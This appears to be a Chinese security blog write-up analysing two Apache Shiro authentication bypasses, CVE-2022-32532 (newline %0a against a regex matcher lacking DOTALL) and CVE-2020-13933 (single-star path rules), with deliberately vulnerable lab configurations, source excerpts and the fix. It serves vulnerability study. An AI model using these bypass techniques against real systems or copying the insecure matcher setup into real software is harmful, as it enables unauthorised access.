> 参考: https://blog.csdn.net/Destiny_one/article/details/141137744  
  
### CVE-2022-32532 Shiro < 1.9.1 认证绕过  
  
搭建过程就不描述了, 这里使用SpringBoot + Shiro  
的一个环境, 参考本文就可以. 只不过我们修改一下Shiro  
的引入版本即可:  
```
<dependency>    <groupId>org.apache.shiro</groupId>    <artifactId>shiro-spring</artifactId>    <version>1.9.0</version></dependency>
```  
#### 调用点回顾  
  
根据我们前面读取Shiro  
底层源码可知,Shiro  
会对每次请求进行处理, 对当前的URI  
与Shiro  
中已经配置好的过滤器进行匹配, 其匹配核心过程为AbstractShiroFilter::doFilterInternal  
方法为请求起点, 这里把流程图简单看一下.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQLzQ8e5xnLx7icPxUGFsurnkG2JKNpjkjiciboGXHwr48HGr7Q61kYjQjA/640?wx_fmt=png&from=appmsg "")  
  
image-20241019150441058.png  
  
可以看到, 整个URL路径的匹配的过程是交给PathMatcher  
的, 而PathMatcher  
的实现类只有AntPathMatcher && RegExPatternMatcher  
这两种.  
#### 漏洞产生原因  
  
其中漏洞点在于RegExPatternMatcher  
这个PathMatcher  
. 这个Matcher  
的匹配规则很简单:  
```
public boolean matches(String pattern, String source) {    if (pattern == null) {        throw new IllegalArgumentException("pattern argument cannot be null.");    }    Pattern p = Pattern.compile(pattern); // 使用了默认的匹配规则, 并没有设置匹配模式.    Matcher m = p.matcher(source);    return m.matches();}
```  
  
使用Java  
原生的正则表达式进行匹配. 而原生匹配模式中, 这样会返回false  
.  
```
public class T1 {    public static void main(String[] args) {        Pattern p = Pattern.compile("/admin/.*");        Matcher m = p.matcher("/admin/hel\nlo"); // 遇到换行符, 返回 false.        boolean matches = m.matches();        System.out.println("匹配结果: " + matches); // 返回 false    }}
```  
  
放在URL  
匹配中,/admin/.*  
表达的含义为: 匹配admin  
目录下的所有路径. 但由于没有设置正则表达式的点号匹配所有  
模式, 这里可以通过%0a 换行符  
进行绕过, 从而绕过了Shiro  
安全框架的检测.  
  
修复漏洞案例如下:  
```
public class T1 {    public static void main(String[] args) {        Pattern p = Pattern.compile("/admin/.*", Pattern.DOTALL);        Matcher m = p.matcher("/admin/hel\nlo");        boolean matches = m.matches();        System.out.println("匹配结果: " + matches); // 返回 true    }}
```  
#### 漏洞鸡肋点  
  
而Shiro  
默认使用的匹配器为AntPathMatcher  
, 如下:  
```
public AbstractShiroFilter getObject() throws Exception { // ShiroFilterFactoryBean::getObject    if (instance == null) {        instance = createInstance();    }    return instance;}protected AbstractShiroFilter createInstance() throws Exception { // ShiroFilterFactoryBean::createInstance()    SecurityManager securityManager = getSecurityManager();    FilterChainManager manager = createFilterChainManager();    PathMatchingFilterChainResolver chainResolver = new PathMatchingFilterChainResolver(); // 注意这里    chainResolver.setFilterChainManager(manager);    return new SpringShiroFilter((WebSecurityManager) securityManager, chainResolver); // SpringShiroFilter 访问修饰符是 private    /*     private static final class SpringShiroFilter extends AbstractShiroFilter {...}    */}public PathMatchingFilterChainResolver() {    this.pathMatcher = new AntPathMatcher(); // 默认使用 AntPathMatcher, 而不是 RegExPatternMatcher    this.filterChainManager = new DefaultFilterChainManager();}
```  
  
所以默认的Shiro  
在程序员不设置RegExPatternMatcher  
的情况下, 漏洞是无法触发的.  
#### 漏洞复现  
  
想要漏洞复现, 就需要手动配置一下RegExPatternMatcher  
, 并重写AbstractShiroFilter::createInstance  
的方法逻辑, 自己设置一个RegExPatternMatcher  
过去. 那么我们就必须继承ShiroFilterFactoryBean  
, 重写AbstractShiroFilter::createInstance  
方法, 由于SpringShiroFilter  
这个类的访问权限为private  
, 所以我们只能在AbstractShiroFilter  
这个类中进行重新定义.  
##### 坑点: 不能使用 createFilterChainManager  
  
定义如下ShiroFilter  
:  
```
public class MyShiroFilter extends ShiroFilterFactoryBean {    @Override    protected AbstractShiroFilter createInstance() throws Exception {        SecurityManager securityManager = (SecurityManager) getSecurityManager();        FilterChainManager manager = createFilterChainManager();        PathMatchingFilterChainResolver chainResolver = new PathMatchingFilterChainResolver(); // 注意这里        chainResolver.setPathMatcher(new RegExPatternMatcher()); // 默认匹配器改为 RegExPatternMatcher        chainResolver.setFilterChainManager(manager);        return new SpringShiroFilter((WebSecurityManager) securityManager, chainResolver);    }    static final class SpringShiroFilter extends AbstractShiroFilter {        protected SpringShiroFilter(WebSecurityManager webSecurityManager, FilterChainResolver resolver) {            setSecurityManager(webSecurityManager);            setFilterChainResolver(resolver);        }    }}
```  
  
这里笔者复现时, 遇见了一个问题, 就是我们不能通过createFilterChainManager()  
方法来创建FilterChainManager  
, 因为这个方法会增加一个默认路由. 受到了CVE-2020-13933  
的修复影响.  
```
protected FilterChainManager createFilterChainManager() {    // ... 其他代码    manager.createDefaultChain("/**");    return manager;}
```  
  
根据Shiro  
底层原理, 当我们的/admin/.*  
绕过成功后, 会继续匹配/**  
, 而/**  
使用了RegExPatternMatcher  
会抛出正则表达式错误, 因为/**  
不是一个合法的正则表达式. 所以我们只可以通过new FilterChainManager()  
. 但new FilterChainManager()  
不会对filters  
成员属性进行初始化, 没有filters  
成员属性, 也就意味着我们没有任何拦截器可用,Shiro  
就失效了! 所以我们还需要手动加几个系统内置的Filter  
, 很是麻烦!  
  
那么我们修改后的定义如下:  
```
public class MyShiroFilter extends ShiroFilterFactoryBean {    @Override    protected AbstractShiroFilter createInstance() throws Exception {        org.apache.shiro.mgt.SecurityManager securityManager = getSecurityManager();        // FilterChainManager manager = createFilterChainManager(); // 改为如下情况        FilterChainManager manager = new DefaultFilterChainManager();        manager.addFilter("authc",new FormAuthenticationFilter()); // 根据底层需要, 被迫手动添加        manager.addToChain("/user/.*", "authc"); // 根据底层需要, 被迫手动添加        PathMatchingFilterChainResolver chainResolver = new PathMatchingFilterChainResolver();        chainResolver.setPathMatcher(new RegExPatternMatcher()); // 默认匹配器改为 RegExPatternMatcher        chainResolver.setFilterChainManager(manager);        return new SpringShiroFilter((WebSecurityManager) securityManager, chainResolver);    }    static final class SpringShiroFilter extends AbstractShiroFilter {        protected SpringShiroFilter(WebSecurityManager webSecurityManager, FilterChainResolver resolver) {            setSecurityManager(webSecurityManager);            setFilterChainResolver(resolver);        }    }}
```  
##### 坑点: 手动创建 Filter, 并加入 PathMatchingFilterChainResolver  
  
上述修改完毕后仍然失败, 原因则是,Shiro  
提供的所有Filter  
中, 也有自己的匹配器, 它们默认依然是AntPathMatcher  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQmhotxwibjTVFhoKWeibEISgf9c88w1Ae4AWss7L2TYVG1B4ib5KJQ3LlA/640?wx_fmt=png&from=appmsg "")  
  
image-20241019172215264.png  
  
所以我们只能通过自定义一个Filter  
, 来装上RegExPatternMatcher  
, 漏洞才能触发.  
```
public class MyAuthenticationFilter extends AccessControlFilter {    public MyAuthenticationFilter() {        super();        this.pathMatcher = new RegExPatternMatcher(); // 被迫修改系统内置的 PatternMatcher, 否则漏洞无法触发.    }    @Override    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception {        response.getWriter().println("no permission!");        return false; // 设置没有权限访问    }    @Override    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {        return false; // 设置没有权限访问    }}
```  
  
并且配置在MyShiroFilter  
中:  
```
public class MyShiroFilter extends ShiroFilterFactoryBean {    @Override    protected AbstractShiroFilter createInstance() throws Exception {        org.apache.shiro.mgt.SecurityManager securityManager = getSecurityManager();        // FilterChainManager manager = createFilterChainManager(); // 改为如下情况        FilterChainManager manager = new DefaultFilterChainManager();        manager.addFilter("authc",new MyAuthenticationFilter()); // 根据底层需要, 被迫手动添加        manager.addToChain("/user/.*", "authc"); // 根据底层需要, 被迫手动添加        PathMatchingFilterChainResolver chainResolver = new PathMatchingFilterChainResolver();        chainResolver.setPathMatcher(new RegExPatternMatcher()); // 默认匹配器改为 RegExPatternMatcher        chainResolver.setFilterChainManager(manager);        return new SpringShiroFilter((WebSecurityManager) securityManager, chainResolver);    }    static final class SpringShiroFilter extends AbstractShiroFilter {        protected SpringShiroFilter(WebSecurityManager webSecurityManager, FilterChainResolver resolver) {            setSecurityManager(webSecurityManager);            setFilterChainResolver(resolver);        }    }}
```  
  
ShiroAutoConfiguration  
配置如下:  
```
@Beanpublic ShiroFilterFactoryBean shiroFilterFactoryBean() {    ShiroFilterFactoryBean shiroFilterFactoryBean = new MyShiroFilter();    shiroFilterFactoryBean.setSecurityManager(getSecurityManager()); // 设置安全管理器    shiroFilterFactoryBean.setLoginUrl("/login"); // 默认登录页面    shiroFilterFactoryBean.setUnauthorizedUrl("/login"); // 未认证的情况, 也跳转到登录页面    return shiroFilterFactoryBean;}
```  
##### 成功复现  
  
定义控制器如下:  
```
@GetMapping("/user/{data}")@ResponseBodypublic String getData(@PathVariable String data) {    return "OK~~ data: " + data;}
```  
  
看一下两种情况对比:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQ3jRACiacuHOMiaLdXQzrt3oC0CsTCgAuPsSIyXYKKvkGGW2YYqyS2CnA/640?wx_fmt=png&from=appmsg "")  
  
image-20241019173152238.png  
  
实际场景中, 几乎不可能遇到这样编码的程序员. 需要具备三个条件:  
- 程序员感觉 Shiro 提供的默认匹配器不好用, 大费周章的自己研究怎么搞正则表达式匹配器  
  
- 程序员知道了怎么搞正则表达式匹配器, 但是总是匹配不上 (匹配到/**), 所以程序员去翻了底层代码进行研究  
  
- 程序员终于配置好了, 正则表达式匹配器也能用, 于是程序员成功使用了.*  
  
总结: 实战很难遇到, 概率有点非人性化了, 但作为Java漏洞学习一切都值了. 2333...  
### CVE-2020-13933 Shiro < 1.5.4 认证绕过  
#### 漏洞复现  
  
搭建过程就不描述了, 这里使用SpringBoot + Shiro  
的一个环境, 参考本文就可以. 只不过我们修改一下Shiro  
的引入版本即可:  
```
<dependency>    <groupId>org.apache.shiro</groupId>    <artifactId>shiro-spring</artifactId>    <version>1.5.3</version></dependency>
```  
  
以及本漏洞需要的配置信息  
, 配置在ShiroAutoConfiguration  
中:  
```
@Beanpublic ShiroFilterFactoryBean shiroFilterFactoryBean() {    ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();    shiroFilterFactoryBean.setSecurityManager(getSecurityManager()); // 设置安全管理器    HashMap<String, String> filterChainDefinitionMap = new HashMap<>(); // 准备过滤好需过滤的 URL    filterChainDefinitionMap.put("/user/*", "authc"); // 登陆过后才能访问, 使用 /user/任意值 也可以进行漏洞复现    filterChainDefinitionMap.put("/login", "anon"); // 登录口无需    shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);    shiroFilterFactoryBean.setLoginUrl("/login"); // 默认登录页面    shiroFilterFactoryBean.setUnauthorizedUrl("/login"); // 未认证的情况, 也跳转到登录页面    return shiroFilterFactoryBean;}
```  
  
漏洞触发需要/user/*  
一个星号, 如果是/user/**  
则不行, 我们准备对应的控制器:  
```
@RestController@RequestMapping("/user")public class UserController {    @RequestMapping("/{data}")    public String data(@PathVariable String data) {        return "success! data: " + data;    }}
```  
  
那么我们先来一波复现:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQSRXpl2HV3uaeD35ChDQK6zo0Wf9GWM8ofrozueU694ZicPqtZehoibaA/640?wx_fmt=png&from=appmsg "")  
  
image-20241019182904047.png  
  
下面我们来进行漏洞复现.  
#### 漏洞分析  
  
我们知道的是, 在Shiro  
中,URL  
匹配是由AntPathMatcher  
进行处理的, 在处理之前, 会经过一次PathMatchingFilterChainResolver::getChain  
操作, 我们看一下该方法做了什么操作:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQslIicd7Pfg5ibziaI9epl5wuL3PD7IUxneW9gnlicuxMBNbR6z9kJ9pcyA/640?wx_fmt=png&from=appmsg "")  
  
image-20241019200703761.png  
  
可以看到, 最终调用了HttpServletRequest.getServletPath()  
方法, 比较有意思的是,Tomcat  
会自动对传递过来的getServletPath()  
进行URL解码操作, 笔者在这里准备一个JSP页面:  
```
<% out.println(request.getServletPath()); %>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQkv5dZmH5WOYqA5iay1rdKpXJBhD932KGFO68OFHbUXhumVPTlhicNRqw/640?wx_fmt=png&from=appmsg "")  
  
image-20241019200919699.png  
  
那么回到程序正常走向, 看一下后面做了什么操作.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQDtHe81PUjtdwYAUicUU2Vsl1eSx03QvlyPEnAkgTlWQubEDKzFvuerw/640?wx_fmt=png&from=appmsg "")  
  
image-20241019201351250.png  
  
最后处理完毕之后, 删除了最后的/  
, 变为了/user  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQbic4CoRc937tEvQo4E4k5Gsc1V6icVkyUrEQIcpE3lH3ibQxNUBf4594A/640?wx_fmt=png&from=appmsg "")  
  
image-20241019202542840.png  
  
而我们知道的是,Shiro  
匹配路径信息, 默认是使用的PathMatchingFilterChainResolver::getChain  
, 而我们的/user  
最终会调用到该方法中, 由于图中处理比较复杂, 所以笔者将分块截图.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQVCoNNKQhrHGvFib9COYE9JbqXNmwfR0kmnibVRbQ3lRmBCVjp0k4v4cQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241019204719597.png  
  
那么我们继续往下看:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn5p8eq1Mm4gMP5SdkpYmtAQYiahPZLQic0xCIsD8sianrxzFp39yQxFr14KN5Pq1GLYPZl5ovPHs0omg/640?wx_fmt=png&from=appmsg "")  
  
image-20241019210049763.png  
  
可以看到的是:  
- 如果规则是/user/**  
的话, 那么进入到最后的for  
循环之后, 最终return true  
, 这样仍然调用进了Shiro  
的过滤器进行认证等操作.  
  
- 那么这里如果是*  
, 就会直接返回一个false  
, 从而绕过了过滤器验证.  
  
而未经过任何验证, 就进入到了SpringBoot  
的DispatcherServlet  
中, 而我们知道的是,Spring  
容器封装了Tomcat  
, 我们最终的请求打过去, 最终也会被SpringBoot中的模糊匹配所匹配到, 例如:/xxx  
会被/{path}  
匹配.  
```
@RestController@RequestMapping("/user")public class UserController {    @RequestMapping("/{data}")    public String data(@PathVariable String data) { // SpringBoot 可以找到, 并且 data 由于被 Tomcat 处理, 所以 data 值最终接收的为:  ;xxx        return "success! data: " + data;    }}
```  
## Reference  
  
https://www.bilibili.com/video/BV1pa4y1471s/  
  
https://xz.aliyun.com/t/10696  
  
https://www.cnblogs.com/zwh0910/p/17168833.html  
  
https://blog.csdn.net/m0_54853503/article/details/126114009  
  
https://blog.csdn.net/weixin_44251024/article/details/86544900  
  
https://blog.csdn.net/weixin_54902210/article/details/129122996  
  
https://cert.360.cn/report/detail?id=0a56bda5f00172dd642f2b436ed49cc7  
  
https://bbs.zkaq.cn/t/30954.html  
  
https://www.cnblogs.com/dustfree/p/17589314.html  
  
